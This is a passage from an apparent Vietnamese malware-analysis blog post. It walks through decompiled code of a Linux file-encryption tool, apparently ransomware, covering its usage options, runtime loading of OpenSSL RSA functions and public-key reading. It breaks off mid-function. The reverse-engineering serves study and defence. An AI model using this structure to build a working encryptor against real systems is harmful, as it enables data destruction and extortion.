</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>),<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">local_18</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x10</span>),<span style="color:#e06c75">local_20</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;encrypt_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;create_rsa_obj&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;get_pk_data&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;init_libssl returned %d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_c</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình sẽ phân tích từng phần code trong hàm <code>main</code> này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span></code></pre></div><p>Chúng ta thấy được là hàm <code>main</code> sẽ lấy 2 tham số. Thường thì trong chương trình C, 2 tham số này sẽ là <code>argc</code> và <code>argv</code>. <code>argc</code> là số các đối số và <code>argv</code> là mảng chứa các đối số đó.</p>
<p>Để làm cho việc phân tích file nhị phân này dễ hơn thì khi mà mình đoán được 1 biến được sử dụng để làm gì thì mình sẽ đặt lại tên cho nó. Mình sẽ đặt tên <code>param_1</code> thành <code>argc</code> và <code>param_2</code> thành <code>argv</code></p>
<p>Và bởi vì <code>param_2</code> có kiểu dữ liệu là <code>long</code>, mình sẽ đổi nó thành <code>char**</code> bởi vì đó là kiểu dữ liệu mà <code>argv</code> sử dụng.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">argc</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn code này sẽ in ra cách sử dụng file nhị phân này. Từ đây mình thấy là nó sẽ cần file khóa công khai và đường dẫn tới file cần được mã hóa. Mình cũng thấy là file này có thể lấy thêm các đối số khác như là số bước mã hóa, độ lớn file và số MB trong block mã hóa.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">3</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">4</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">5</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn code này sẽ check xem file nhị phân có thêm đối số, nếu có thì nó sẽ xử lý các đối số thêm đó. Các đối số thêm đó đã được nhắc đến trong tin nhắn sử dụng trên.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span></code></pre></div><p>Ở đây thì chương trình sẽ gọi hàm <code>init_libssl()</code>. Hàm này nghe khá thú vị nên mình sẽ check xem hàm này sẽ làm những gì.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#98c379">&#34;libssl.so&#34;</span>,<span style="color:#d19a66">2</span>);
</span></span></code></pre></div><p>Trong hàm này sẽ sử dụng hàm <code>dlopen()</code>. Hàm này sử dụng trình liên kết để mở file <code>libssl.so</code>. Trình liên kết sẽ liên kết các file đã được biên dịch với chương trình hiện tại. Thế là hàm này đang cố liên kết file <code>libssl.so</code> với file nhị phân này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x10</span>; <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">sprintf</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#98c379">&#34;libssl.so.%d&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_3c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>) <span style="color:#c678dd">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_00400de1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tiếp theo thì nếu như <code>plibssl == 0</code> (nếu như hàm <code>dlopen()</code> fail, không mở được file <code>libssl.so</code>) thì nó sẽ cố tìm 1 phiên bản nào đó của <code>libssl.so</code> bằng cách dùng kí tự wildcard <code>&quot;libssl.so.%d&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lBIO_new_mem_buf</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>);
</span></span></code></pre></div><p>Sau khi nó tìm được 1 file <code>libssl.so</code>, nó sẽ sử dụng <code>dlsym()</code> để load symbol <code>BIO_new_mem_buf</code> từ libssl trong khi chạy.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;ERR_error_string&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSAPrivateKey&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_private_decrypt&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_size&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Các đoạn code này cũng sẽ làm việc giống như đoạn trước. Tức là hàm này sẽ lấy các hàm khác nhau bằng cách sử dụng linker để sau này nó có thể sử dụng các hàm đó. Nhìn vào đoạn code này thì mình có thể đoán được chương tình này sẽ làm những gì.</p>
<p>Nó lấy <code>PEM_read_bio_RSA_PUBKEY</code> để đọc khóa công khai RSA, nó lấy <code>PEM_read_bio_RSAPrivateKey</code> để đọc khóa bí mật RSA, nó lấy <code>RAND_pseudo_bytes</code> để tạo byte random, các byte này chắc sẽ được sử dụng cho việc mã hóa các file, vân vân. Từ mấy hàm này thì mình có thể đoán là nó đang load các hàm liên quan đến thuật toán mã hóa <strong>RSA</strong> để nó có thể sử dụng cho việc mã hóa.</p>
<p>Đó là hàm <code>init_libssl()</code>, nó sẽ load các hàm từ <code>libssl</code> để sau này chương trình này có thể sử dụng. Mình sẽ quay lại hàm <code>main</code> và tiếp tục phân tích code trong hàm đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">1</span>],<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span></code></pre></div><p>Tiếp theo, chương trình này sẽ gọi hàm nữa gọi là <code>get_pk_data()</code>. Mình đoán là <code>pk</code> là viết tắt cho <em>public key</em>, nghĩa là khóa công khai, bởi vì chương trình này đang cần mã hóa file và khóa công khai sẽ được sử dụng cho việc mã hóa file trong mã hóa bất đối xứng.</p>
<p>Nhưng để có thể chắc chắn thì mình sẽ mở hàm đó lên và xem nó làm những gì.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read</span>(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_pk_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ đọc 1 file <code>param_1</code>, File này sẽ là <code>argv[1]</code> và nó sẽ là file khóa công khai.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [end]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;get_pk_data: key file is empty!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ dùng <code>lseek()</code> để đi đến cuối file và kiểm tra xem file đó có trống hay không.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pvVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>(<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar1</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [start]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">read</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">__nbytes</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">DAT_0040841e</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">close</span>(<span style="color:#e06c75">__fd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ tạo 1 buffer với kích cỡ <code>__nbytes + 1</code> và đọc từ file khóa vừa mở vào buffer này, buffer này sẽ được gán vào <code>param_2</code>, rồi nó sẽ đóng file và trả về <code>main</code>.</p>
<p>Nhìn chung thì hàm <code>get_pk_data()</code> sẽ đọc file khóa công khai vào tham số thứ 2 của hàm. Thế thì mình sẽ đặt lại tên tham số này trong hàm <code>main</code> (hiện tại là <code>local_18</code>) thành <code>public_key_buffer</code>. Mình sẽ quay lại hàm <code>main</code> và tiếp tục phân tích.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">public_key_buffer</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span></code></pre></div><p>Tiếp theo chương trình sẽ gọi hàm <code>create_rsa_obj</code>. Hàm này chắc sẽ lấy <code>public_key_buffer</code> mà <code>get_pk_data()</code> vừa tạo, tạo 1 đối tượng RSA và gán đối tượng đó vào <code>local_20</code>.</p>
<p>Để kiểm chứng giả thuyết của mình thì mình sẽ phân tích code trong hàm này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">lVar1</span>;
